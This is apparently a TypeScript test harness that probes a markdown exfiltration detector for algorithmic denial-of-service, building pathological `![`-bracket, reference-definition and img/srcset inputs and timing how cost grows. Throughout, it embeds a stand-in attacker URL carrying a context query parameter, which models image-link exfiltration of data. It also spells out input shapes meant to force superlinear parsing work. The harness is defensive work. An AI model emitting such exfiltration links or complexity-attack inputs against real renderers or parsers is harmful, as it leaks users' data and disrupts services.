// T82 — independent attack on T81's cost property P:
//   "no quantity the document can write changes the asymptotic cost; total label
//    work is Theta(content.length)".
//
// Three parts are attacked separately:
//   (1) the `!` gate moved in front of the work  -> shapes made entirely of `![`
//   (2) the structural `]` fact and the disjointness it implies -> shapes that
//       try to make two candidate spans OVERLAP, i.e. raise `maxOpenBrackets`
//   (3) the LABEL_WORK_FACTOR budget -> shapes that try to buy superlinear work
//       under a raised `[` threshold, and shapes that exhaust it
// plus paths the repair did NOT touch, because P is a claim about this file's
// cost and a denial of service anywhere in the mandatory floor is a defect.
//
// Usage:
//   bun T82-cost.ts ladder            -- growth exponent per shape
//   bun T82-cost.ts sweep             -- cost at CONSTANT total size while the
//                                        attacker's dials move (the direct test of P)
//   bun T82-cost.ts one <shape> <n>   -- one shape, one size, one process
//
// Read-only, offline, synthetic hosts only.
import { detectExfil } from "../../../../src/security/detect/exfil";

const U = "https://attacker.invalid/p?ctx=CTX";

// --------------------------------------------------------------------------
// shape builders. `n` is the primary dial; every builder returns a document.
// --------------------------------------------------------------------------
const bracketKey = (k: number) => "[".repeat(k);

const shapes: Record<string, (n: number) => string> = {
  // (1) the `!` gate: every open is an IMAGE open, so the gate cannot help.
  bangOpenRun_longDef: (n) => "![".repeat(n) + "]" + `\n\n[${"L".repeat(20000)}]: ${U}\n`,
  bangBalancedNest_longDef: (n) =>
    "![".repeat(n) + "]".repeat(n) + `\n\n[${"L".repeat(20000)}]: ${U}\n`,
  bangRunManyCloses_longDef: (n) =>
    "![]".repeat(n) + `\n\n[${"L".repeat(20000)}]: ${U}\n`,

  // (2) raise `maxOpenBrackets` so candidate spans may carry `[` and therefore
  //     need not be disjoint. This is the only lever the proof leaves open.
  bangOpenRun_bracketKey: (n) =>
    "![".repeat(n) + "]" + `\n\n[${bracketKey(n)}]: ${U}\n`,
  bangBalancedNest_bracketKey: (n) =>
    "![".repeat(n) + "]".repeat(n) + `\n\n[${bracketKey(n)}]: ${U}\n`,
  // every `![` open gets its own `]` AND the span between carries `[`
  bangRunManyCloses_bracketKey: (n) =>
    "![[a]".repeat(n) + `\n\n[${bracketKey(n)}]: ${U}\n`,
  // full-reference form: the label span sits between the description and a far `]`
  bangFullRef_bracketKey: (n) =>
    "![d][".repeat(n) + "]" + `\n\n[${bracketKey(n)}]: ${U}\n`,
  // maximise the number of DISTINCT candidate spans under a raised threshold
  bangOpenRunTwoCloses_bracketKey: (n) =>
    "![".repeat(n) + "]]" + `\n\n[${bracketKey(n)}]: ${U}\n`,

  // (3) budget: many definitions, many distinct lengths, resolving uses
  manyDefsThenBangRun: (n) => {
    const defs: string[] = [];
    for (let i = 0; i < Math.min(n, 4000); i += 1) defs.push(`[k${"x".repeat(i % 200)}${i}]: ${U}\n`);
    return "![".repeat(n) + "]" + "\n\n" + defs.join("");
  },
  resolvingBangUses: (n) => {
    const uses = "![k]".repeat(n);
    return uses + `\n\n[k]: ${U}\n`;
  },

  // whitespace inflation against the non-whitespace-count filter
  wsInflatedBangRun: (n) => "![ \t\n".repeat(n) + "]" + `\n\n[${"L".repeat(20000)}]: ${U}\n`,
  wsInflatedBracketKey: (n) => "![ \t\n".repeat(n) + "]" + `\n\n[${bracketKey(n)}]: ${U}\n`,

  // paths this repair did not touch, measured because a DoS anywhere in the
  // mandatory floor is a defect at the same boundaries
  inlineOpenParenRun: (n) => "[a](".repeat(n) + ")",
  inlineNoCloseParen: (n) => "[a](".repeat(n),
  inlineNestedDest: (n) => "[a](http://h/" + "[x](y)".repeat(n) + ")",
  linkRunSharedDest: (n) => "[".repeat(n) + "](" + U + ")",
  bangRunSharedDest: (n) => "![".repeat(n) + "](" + U + ")",
  plainBracketRun_noDef: (n) => "[".repeat(n) + "]",
  htmlImgRun: (n) => `<img src="${U}">`.repeat(n),
  srcsetRun: (n) => `<img srcset="${Array.from({ length: 200 }, (_, i) => `${U}${i} ${i}w`).join(", ")}">`.repeat(Math.max(1, Math.floor(n / 200))),
  angleDefRun: (n) => "![a]\n\n" + `[a]: <${U}>\n`.repeat(Math.max(1, Math.floor(n / 40))),
  prose: (n) => {
    const para = "Lorem ipsum dolor sit amet, consectetur [adipiscing] elit sed do eiusmod. ";
    return para.repeat(n) + `\n\n[${"A sentence shaped label ".repeat(200)}]: ${U}\n`;
  },
};

function timeOnce(text: string): number {
  const t0 = performance.now();
  detectExfil(text, []);
  return performance.now() - t0;
}
function best(text: string, runs = 3): number {
  let m = Infinity;
  for (let i = 0; i < runs; i += 1) m = Math.min(m, timeOnce(text));
  return Math.round(m * 10) / 10;
}

function exponent(points: Array<{ bytes: number; ms: number }>): number {
  const a = points[0] as { bytes: number; ms: number };
  const b = points[points.length - 1] as { bytes: number; ms: number };
  if (a.ms <= 0 || b.ms <= 0) return 0;
  return Math.round((Math.log(b.ms / a.ms) / Math.log(b.bytes / a.bytes)) * 100) / 100;
}

const mode = process.argv[2] ?? "ladder";

if (mode === "one") {
  const name = process.argv[3] as string;
  const n = Number(process.argv[4]);
  const text = (shapes[name] as (n: number) => string)(n);
  console.log(JSON.stringify({ shape: name, n, bytes: text.length, ms: best(text) }));
} else if (mode === "sweep") {
  // The direct test of P: total size held CONSTANT while the dials the document
  // controls are swept across five orders of magnitude. A bound an attacker can
  // inflate shows up as a climbing row.
  const TOTAL = 262144;
  const rows: Array<Record<string, unknown>> = [];

  const padTo = (body: string, total: number) =>
    body.length >= total ? body : body + "\n" + "z".repeat(total - body.length - 1);

  // dial A: definition label LENGTH
  const dialA: Array<[number, number]> = [];
  for (const len of [0, 4, 64, 1000, 20000, 100000]) {
    const def = len === 0 ? "" : `\n\n[${"L".repeat(len)}]: ${U}\n`;
    const body = "![".repeat(20000) + "]" + def;
    dialA.push([len, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "definitionLabelLength", points: dialA });

  // dial B: `[` INSIDE the definition label -> raises maxOpenBrackets, the one
  // threshold the proof concedes a document can raise
  const dialB: Array<[number, number]> = [];
  for (const k of [0, 1, 10, 1000, 20000, 60000]) {
    const key = k === 0 ? "L".repeat(1000) : "[".repeat(k);
    const body = "![".repeat(20000) + "]" + `\n\n[${key}]: ${U}\n`;
    dialB.push([k, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "openBracketsInKey", points: dialB });

  // dial C: NUMBER of definitions
  const dialC: Array<[number, number]> = [];
  for (const count of [1, 10, 100, 1000, 5000]) {
    const defs = Array.from({ length: count }, (_, i) => `[k${i}]: ${U}\n`).join("");
    const body = "![".repeat(5000) + "]" + "\n\n" + defs;
    dialC.push([count, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "definitionCount", points: dialC });

  // dial D: number of `![` OPENS at constant size (the rest is filler)
  const dialD: Array<[number, number]> = [];
  for (const opens of [1, 100, 10000, 60000, 130000]) {
    const body = "![".repeat(opens) + "]" + `\n\n[${"[".repeat(60000)}]: ${U}\n`;
    dialD.push([opens, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "bangOpensWithBracketKey", points: dialD });

  // dial E: number of `]` (candidate description ends) at constant size
  const dialE: Array<[number, number]> = [];
  for (const closes of [1, 10, 1000, 20000, 60000]) {
    const body = "![".repeat(60000) + "]".repeat(closes) + `\n\n[${"[".repeat(60000)}]: ${U}\n`;
    dialE.push([closes, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "closesWithBracketKey", points: dialE });

  // dial F: ratio of `![` opens to key `[` count, both large
  const dialF: Array<[string, number]> = [];
  for (const [opens, k] of [
    [1000, 1000],
    [10000, 10000],
    [30000, 30000],
    [60000, 60000],
  ] as Array<[number, number]>) {
    const body = "![".repeat(opens) + "]" + `\n\n[${"[".repeat(k)}]: ${U}\n`;
    dialF.push([`${opens}x${k}`, best(padTo(body, TOTAL))]);
  }
  rows.push({ dial: "opensTimesKeyBrackets", points: dialF });

  const flat = rows.map((r) => {
    const pts = (r.points as Array<[unknown, number]>).map((p) => p[1]);
    return { dial: r.dial, min: Math.min(...pts), max: Math.max(...pts), spread: Math.round((Math.max(...pts) - Math.min(...pts)) * 10) / 10 };
  });
  console.log(JSON.stringify({ probe: "T82-cost/sweep", totalBytes: TOTAL, rows, summary: flat }, null, 2));
} else {
  const sizes = [8000, 16000, 32000, 64000];
  const rows: Array<Record<string, unknown>> = [];
  for (const [name, build] of Object.entries(shapes)) {
    const measured = sizes.map((n) => {
      const text = build(n);
      return { n, bytes: text.length, ms: best(text) };
    });
    rows.push({ shape: name, measured, exponent: exponent(measured) });
  }
  console.log(
    JSON.stringify(
      {
        probe: "T82-cost/ladder",
        rows,
        overOneSecond: rows
          .filter((r) => (r.measured as Array<{ ms: number }>).some((p) => p.ms > 1000))
          .map((r) => r.shape),
        superLinear: rows.filter((r) => (r.exponent as number) >= 1.5).map((r) => r.shape),
      },
      null,
      2,
    ),
  );
}
